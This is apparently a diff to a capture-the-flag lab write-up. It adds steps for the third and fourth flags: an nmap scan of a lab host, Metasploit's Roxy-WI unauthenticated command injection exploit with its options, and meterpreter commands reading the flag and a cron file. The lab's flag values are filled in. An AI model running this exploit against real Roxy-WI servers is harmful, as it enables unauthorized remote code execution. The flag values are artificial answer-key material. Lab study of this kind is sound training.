@@ -88,15 +88,102 @@ Check the file pii_data.xlsx for the second flag
 └─# cat pii_data.xlsx                                                                                                                                                                                           
 FLAG2_56a4a2d91cb94c0bb81616cf948c3680
 ```
+For the third flag, let's use the second host and run the namp scan 
 
+```
+msf6 > db_nmap -sS -sV -sC -O target2.ine.local
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-04 05:47 IST
+[*] Nmap: Nmap scan report for target2.ine.local (192.214.63.4)
+[*] Nmap: Host is up (0.000088s latency).
+[*] Nmap: Not shown: 998 closed tcp ports (reset)
+[*] Nmap: PORT    STATE SERVICE  VERSION
+[*] Nmap: 80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
+[*] Nmap: |_http-title: Roxy-WI
+[*] Nmap: |_http-server-header: Apache/2.4.52 (Ubuntu)
+[*] Nmap: 443/tcp open  ssl/http Apache httpd 2.4.52
+[*] Nmap: |_ssl-date: TLS randomness does not represent time
+[*] Nmap: | ssl-cert: Subject: commonName=*.roxy-wi.org/organizationName=Roxy-WI/stateOrProvinceName=Almaty/countryName=US
+[*] Nmap: | Not valid before: 2022-07-29T05:20:44
+[*] Nmap: |_Not valid after:  2050-12-14T05:20:44
+[*] Nmap: | tls-alpn:
+[*] Nmap: |_  http/1.1
+[*] Nmap: |_http-server-header: Apache/2.4.52 (Ubuntu)
+[*] Nmap: |_http-title: Roxy-WI
+[*] Nmap: MAC Address: 02:42:C0:D6:3F:04 (Unknown)
+[*] Nmap: Device type: general purpose
+[*] Nmap: Running: Linux 4.X|5.X
+[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+[*] Nmap: OS details: Linux 4.15 - 5.8
+[*] Nmap: Network Distance: 1 hop
+[*] Nmap: Service Info: Host: roxy-wi.example.com
+[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds
 
+```
 
+On port 80 and 443 there are websites running and the title is Roxy-WI, therefore, let's search for an exploit with the same name. 
 
+```
+msf6 > search roxy-wi
+
+Matching Modules
+================
+
+   #  Name                             Disclosure Date  Rank       Check  Description
+   -  ----                             ---------------  ----       -----  -----------
+   0  exploit/linux/http/roxy_wi_exec  2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE
+   1    \_ target: Unix (In-Memory)    .                .          .      .
+   2    \_ target: Linux (Dropper)     .                .          .      .
+
+```
+
+Now let's change the parameters in the exploit 
+
+```
+msf6 exploit(linux/http/roxy_wi_exec) > set RHOSTS target2.ine.local
+RHOSTS => target2.ine.local
+msf6 exploit(linux/http/roxy_wi_exec) > set SRVHOST eth1
+SRVHOST => 192.214.63.2
+msf6 exploit(linux/http/roxy_wi_exec) > set LHOST eth1
+LHOST => 192.214.63.2
+msf6 exploit(linux/http/roxy_wi_exec) > set LPORT 1234
+LPORT => 1234
+msf6 exploit(linux/http/roxy_wi_exec) > run
+```
+A meterpreter session is created, and the flag can be obtained 
+
+```
+meterpreter > cat /flag.txt
+FLAG3_762517ae9674412889bbb3b80faa38ab
+```
+
+For the latest flag, we have to take a look to the running processes or scheduled jobs. We need to check cron jobs
+
+```
+meterpreter > ls -l /etc/cron.d
+Listing: /etc/cron.d
+====================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  201   fil   2022-01-09 01:32:36 +0530  e2scrub_all
+100644/rw-r--r--  65    fil   2026-05-04 05:04:28 +0530  www-data-cron
+
+```
+Now cat the files in order to find the flag
+
+```
+meterpreter > cat /etc/cron.d/www-data-cron
+* * * * * www-data echo "FLAG4_a14416a27bae4f7fb178025db8e4f4fd"
+
+```
+Wwe have finished the lab!
 
 ### Final Flags
 
+<img width="1920" height="976" alt="Screenshot 2026-05-03 at 7 45 33 PM" src="https://github.com/user-attachments/assets/685a387a-8b71-4470-beac-84691b613166" />
 
 - Flag 1: 1f96171a565e45489b3e1c17173735cb
 - Flag 2: 56a4a2d91cb94c0bb81616cf948c3680
-- Flag 3: 
-- Flag 4: 
+- Flag 3: 762517ae9674412889bbb3b80faa38ab
+- Flag 4: a14416a27bae4f7fb178025db8e4f4fd
